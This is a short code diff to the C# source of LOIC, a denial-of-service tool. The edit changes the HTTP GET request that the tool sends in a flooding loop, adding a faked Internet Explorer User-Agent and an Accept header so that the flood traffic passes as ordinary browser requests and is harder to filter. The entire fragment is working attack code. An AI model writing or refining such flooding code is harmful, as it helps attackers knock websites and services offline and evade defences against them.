@@ -67,7 +67,7 @@ namespace LOIC
 		{
 			try
 			{
-				byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{3}Host: {2}{3}{3}{3}", Subsite, ( random ? new Functions().RandomString() : null ), Host, Environment.NewLine));
+				byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{3}Host: {2}{3}User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0){3}Accept: */*{3}{3}{3}", Subsite, ( random ? new Functions().RandomString() : null ), Host, Environment.NewLine));
 				IPEndPoint RHost = new IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
 				while (IsFlooding)
 				{
